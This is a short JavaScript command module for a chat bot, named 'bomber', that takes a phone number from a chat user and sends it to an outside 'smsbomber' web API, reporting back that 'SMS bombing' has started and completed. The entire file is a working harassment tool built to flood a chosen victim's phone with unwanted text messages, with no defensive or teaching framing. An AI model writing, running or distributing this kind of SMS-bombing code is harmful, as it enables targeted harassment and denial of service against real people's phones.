 const axios = require("axios");

module.exports.config = {
  name: "bomber",
  version: "1.0",
  author: "Darling",
  countDown: 5,
  role: 2,
  category: "tools",
  guide: "{pn} [phone number]\nExample: {pn} +88017XXXXXXXX"
};

module.exports.onStart = async ({ api, event, args }) => {
  const phone = args[0];

  if (!phone || !/^\+?\d{10,15}$/.test(phone)) {
    return api.sendMessage(
      "🗿 Please enter a valid phone number.\nExample: +8801XXXXXXXXX",
      event.threadID,
      event.messageID
    );
  }

  try {
    const waitMsg = await api.sendMessage(
      `🗿 Starting SMS bombing on ${phone}...`,
      event.threadID
    );

    const res = await axios.get(`https://s4b1k-api-ui-v2.onrender.com/api/smsbomber?phone=${phone}`);
    const data = res.data;

    if (data.status === "success" || res.status === 200) {
      api.sendMessage(
        `🗿 SMS bombing completed!\nStatus: ${data.message || "Check the target device."}`,
        event.threadID,
        event.messageID
      );
    } else {
      api.sendMessage(
        `🗿 Failed to bomb.\nMessage: ${data.message || "Unknown error occurred."}`,
        event.threadID,
        event.messageID
      );
    }

    api.unsendMessage(waitMsg.messageID);

  } catch (err) {
    console.error(err);
    api.sendMessage(
      "🗿 API error or target server is offline.",
      event.threadID,
      event.messageID
    );
  }
};
